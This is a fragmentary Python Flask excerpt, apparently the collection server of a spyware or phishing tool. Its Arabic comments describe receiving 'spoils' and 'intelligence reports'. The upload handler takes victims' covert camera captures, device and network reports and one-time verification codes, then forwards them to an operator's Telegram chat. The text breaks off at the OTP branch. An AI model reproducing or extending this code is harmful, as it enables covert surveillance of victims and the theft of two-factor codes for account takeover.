...
@app.route('/')
def home(): return f"<h1>Global Master {DEV_NAME} Server - Status: Online</h1>"

# --- مركز استقبال الغنائم والتقارير الاستخباراتية ---
...
def upload_data():
    ...
    if data and TARGET_CHAT_ID:
        ...
        # 1. سحب الميديا (صورة/فيديو/صوت)
        if 'image' in data:
            with open("capture.jpg", "wb") as f: f.write(base64.b64decode(data['image']))
            bot.send_photo(chat_id=TARGET_CHAT_ID, photo=open("capture.jpg", "rb"), caption="🎯 صيد ثمين (كاميرا حية)!")
        
        # 2. تقرير الجهاز والشبكة (كشف VPN والـ ISP)
        if 'full_report' in data:
            bot.send_message(chat_id=TARGET_CHAT_ID, text=f"📊 **تقرير استخباراتي شامل:**\n`{data['full_report']}`", parse_mode='Markdown')
        
        # 3. سحب كود التحقق (OTP)
        if 'otp' in data:
